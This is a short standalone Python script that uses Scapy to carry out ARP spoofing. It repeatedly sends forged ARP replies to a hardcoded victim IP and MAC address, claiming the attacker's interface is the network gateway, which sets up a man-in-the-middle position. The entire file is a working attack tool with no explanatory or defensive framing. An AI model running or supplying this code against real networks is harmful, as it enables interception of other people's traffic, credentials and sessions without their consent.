from scapy.all import ARP, Ether, sendp, get_if_hwaddr
import time

def perform_arp_spoof():
    interface = "eth0"
    victim_ip = "192.168.1.38"
    gateway_ip = "192.168.1.1"
    victim_mac = "b4:8c:9d:31:cb:ef"
    attacker_mac = get_if_hwaddr(interface)

    ethernet_layer = Ether(src=attacker_mac, dst=victim_mac)
    arp_layer = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=attacker_mac, hwdst=victim_mac)
    packet = ethernet_layer / arp_layer

    print(f"Sending spoofed ARP to {victim_ip} claiming to be {gateway_ip} on {interface}")
    try:
        while True:
            sendp(packet, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")

if __name__ == "__main__":
    perform_arp_spoof()
